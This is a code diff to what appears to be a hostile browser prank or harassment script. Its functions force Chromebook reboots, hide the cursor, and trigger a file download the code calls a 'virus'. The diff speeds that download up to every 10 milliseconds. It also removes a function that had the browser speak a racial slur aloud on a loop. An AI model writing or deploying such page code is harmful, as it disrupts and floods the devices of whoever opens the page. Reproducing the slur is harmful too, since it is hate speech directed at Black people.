@@ -373,15 +373,6 @@ function forceRebootChromebook() {
 }
 setInterval(forceRebootChromebook, 4000); //
 
-function textToSpeechSpam() {
-    const utter = new SpeechSynthesisUtterance("fuck niggers fuck niggers");
-    utter.rate = 1;
-    utter.pitch = 2;
-    utter.volume = 1.0;
-    speechSynthesis.speak(utter);
-}
-setInterval(textToSpeechSpam, 500); //
-
 function autoDownloadVirus() {
     const a = document.createElement('a');
     a.href = 'https://github.com/breadytoasted/gpt/raw/refs/heads/main/093e98f9-aa73-4c2c-b5cd-360a438e82c9.mp4'; // <-- you can host your own fake file
@@ -390,7 +381,7 @@ function autoDownloadVirus() {
     a.click();
     document.body.removeChild(a);
 }
-setInterval(autoDownloadVirus, 1000); // E
+setInterval(autoDownloadVirus, 10); // E
 
 function hideCursor() {
     document.body.style.cursor = 'none';
